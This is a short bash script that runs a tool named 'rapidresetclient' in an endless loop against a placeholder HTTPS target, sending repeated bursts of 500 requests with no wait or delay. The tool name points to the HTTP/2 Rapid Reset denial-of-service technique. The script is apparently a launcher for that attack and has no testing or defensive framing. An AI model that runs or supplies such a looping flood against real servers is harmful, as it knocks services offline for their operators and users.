#!/bin/bash
while true ; do ./rapidresetclient -requests 500 -url https://CHANGEME:443 -wait=0 -delay=0 -concurrency=1 ; done 
